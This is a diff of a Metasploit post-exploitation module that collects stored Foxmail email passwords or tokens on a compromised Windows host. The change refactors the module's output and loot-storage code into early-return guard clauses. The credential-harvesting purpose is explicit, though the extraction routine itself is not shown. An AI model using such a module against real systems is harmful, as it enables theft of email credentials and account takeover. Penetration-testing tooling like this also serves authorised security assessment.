@@ -178,33 +178,40 @@ class MetasploitModule < Msf::Post
     else
       foxmail_path = expand_path(datastore['ACCOUNT_PATH'])
     end
-    if directory?(foxmail_path)
-      result = enum_session_file(foxmail_path)
-      if !result.nil?
-        columns = [
-          'Email',
-          'Server',
-          'Port',
-          'SSL',
-          'Password or Token'
-        ]
-        tbl = Rex::Text::Table.new(
-          'Header' => 'Foxmail Password',
-          'Columns' => columns
-        )
-        result.each do |item|
-          tbl << item.values
-        end
-        if !tbl.rows.empty?
-          print_line(tbl.to_s)
-          path = store_loot('host.foxmail_password', 'text/plain', session, tbl.to_s, 'foxmail_password.txt', 'foxmail Passwords')
-          print_good("Passwords stored in: #{path}")
-        else
-          print_status('Nothing was found')
-        end
-      end
-    else
+    unless directory?(foxmail_path)
       print_error('Could not find the registry entry for the Foxmail account path. Ensure that Foxmail is installed on the target.')
+      return
     end
+
+    result = enum_session_file(foxmail_path)
+
+    if result.nil?
+      print_status('Nothing was found')
+      return
+    end
+
+    columns = [
+      'Email',
+      'Server',
+      'Port',
+      'SSL',
+      'Password or Token'
+    ]
+    tbl = Rex::Text::Table.new(
+      'Header' => 'Foxmail Password',
+      'Columns' => columns
+    )
+    result.each do |item|
+      tbl << item.values
+    end
+
+    if tbl.rows.empty?
+      print_status('Nothing was found')
+      return
+    end
+
+    print_line(tbl.to_s)
+    path = store_loot('host.foxmail_password', 'text/plain', session, tbl.to_s, 'foxmail_password.txt', 'foxmail Passwords')
+    print_good("Passwords stored in: #{path}")
   end
 end
